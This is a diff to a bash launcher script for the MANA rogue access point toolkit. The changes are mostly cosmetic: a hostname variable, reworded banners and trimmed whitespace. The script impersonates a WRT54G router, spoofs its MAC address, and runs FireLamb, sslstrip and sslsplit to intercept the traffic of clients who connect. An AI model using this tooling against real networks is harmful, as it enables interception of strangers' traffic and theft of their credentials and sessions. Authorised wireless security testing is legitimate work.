@@ -1,10 +1,11 @@
 
 #!/bin/bash
 # Original script by Dominic White and Ian de Villiers
-# Changes made by John & Daniel Cuthbert 
+# Changes made by John & Daniel Cuthbert
 
 # Other Useful variables defined
 upstream=eth0
+hostname=WRT54G
 # phy=wlan0
 conf=/root/mana/run-mana/conf/hostapd-karma.conf
 hostapd=/root/mana/hostapd-manna/hostapd/hostapd
@@ -18,19 +19,19 @@ echo -e "\033[38;5;220m--------------------------------------------------\033[39
 echo -e "\033[38;5;220m Welcome to SensePost's MANA \033[39m"
 echo -e "\033[38;5;220m Making Rogue Access Points fun for all \033[39m"
 echo -e "\033[38;5;220m @SensePost / http://sensepost.com \033[39m"
-echo 
-echo -e "\033[38;5;220m This script starts up will start MANA \033[39m"
-echo -e "\033[38;5;220m in NAT mode, with the following: \033[39m"
+echo
+echo -e "\033[38;5;220m This script will start MANA in NAT mode with the \033[39m"
+echo -e "\033[38;5;220m the following options: \033[39m"
 echo -e
-echo -e "\033[38;5;160m	Firelamb \033[39m"
-echo -e "\033[38;5;160m sslstrip \033[39m"
-echo -e "\033[38;5;160m	sslsplit \033[39m"
-echo -e  
-echo -e "\033[38;5;220m You will, however, need an upstream link \033[39m" 
+echo -e "\033[38;5;160m	[+] Firelamb \033[39m"
+echo -e "\033[38;5;160m [+] sslstrip \033[39m"
+echo -e "\033[38;5;160m	[+] sslsplit \033[39m"
+echo -e
+echo -e "\033[38;5;220m You will, however, need an upstream link \033[39m"
 echo -e
 echo -e "\033[38;5;220m This assumes you cloned the git repo into /root/mana"
 echo -e
-echo -e 
+echo -e
 echo -e "\033[38;5;220m Press ENTER to continue \033[39m"
 echo -e
 echo -e "\033[38;5;220m--------------------------------------------------\033[39m"
@@ -66,7 +67,7 @@ fi
 
 # This detects wireless interfaces and exits if no suitable interfaces are found
 
-ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"  
+ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"
 if [ "${ntst}" = '1' ]
 	then
 		echo -e "\033[38;5;120m Whoop!! an active network connection has been detected\033[39m"
@@ -128,12 +129,11 @@ fi
 mstrchk
 
 
-# figure out how to change this back to the orignial hostname when finished...perhaps assign the output of <echo /etc/hostname> to a variable and then run <hostname ${vairable name}>???
 function nmchng()
 {
-echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}WRT54G${nc}."  # Will this change only affect this terminal session.?"
-hostname WRT54G
-echo hostname WRT54G
+	echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}$hostname${nc}."  # Will this change only affect this terminal session.?"
+	hostname $hostname
+	echo hostname $hostname
 sleep 2
 }
 
@@ -242,7 +242,8 @@ iptables -t nat -A PREROUTING -i $phy \
 echo -e "${grn}[+]${nc} (${red}BACKGROUNDED${nc}) Starting FireLamb"
 /root/mana/firelamb/firelamb.py -i $phy & ## Does this need to be killed in the bg When shutdown is given???  fkill="(ps aux | grep XXXXXX | cut -b 11-14 | head -n1)"> followed by <pkill ${fkill}>
 
-echo "Hit enter to kill me"
+echo "${grn}[+]${nc}MANA is now running. If you wish to exit MANA, please press the enter key"
+
 read
 echo -e "${red}[!]${nc} Killing dhcpd"
 pkill dhcpd
@@ -268,5 +269,3 @@ ifconfig $phy down
 macchanger -p $phy
 ifconfig $phy up
 echo -e "${red}EXITING...${nc}" && exit
-
-## echo "####################STOP#######################" && exit #DEV Debugging Stop...
